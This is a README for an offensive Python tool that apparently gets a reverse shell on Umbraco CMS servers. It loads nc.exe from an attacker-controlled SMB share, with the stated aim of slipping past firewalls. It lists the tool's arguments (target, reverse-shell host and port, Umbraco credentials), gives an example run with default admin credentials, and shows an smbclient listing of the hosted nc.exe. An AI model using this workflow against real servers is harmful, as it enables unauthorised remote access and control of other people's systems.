# Easy-embraco-SMB

## What's it for?
Script is used to gain an easy reverse shell on servers running embraco and have SMB enabled. To escape firewall, calling our nc.exe executable from a remote destiation (our machine) will allow us to load the application into memory on the server side without having the need to install anything.

## Command line arguments
Easy-embraco-SMB.py [-h] --target TARGET --host HOST [--port PORT] [--load LOAD] --user USER --passw PASSW

optional arguments:\
  \-h, \-\-help            show this help message and exit\
  \--target TARGET, \-t TARGET Target IP address\
  \--host HOST, \-x HOST  IP for reverse shell\
  \--port PORT, \-p PORT  Port for reverse shell\
  \--load LOAD, \-l LOAD  Path to file or script to provide to the public\
  \--user USER, \-P USER  User name for Umbraco\
  \--passw PASSW, \-U PASSW  Password for Umbraco\


## Example usage
sudo python3 Easy-embraco-SMB.py --target 0.0.0.0 --host 0.0.0.0 --port 4444 --user admin@admin.com --pass admin --load ./nc.exe

## Confirmation SMB is hosting our nc.exe file
sudo smbclient -H \\\\127.0.0.1\\share\

smb: \> dir\
  .      \
  ..     \
  nc.exe 
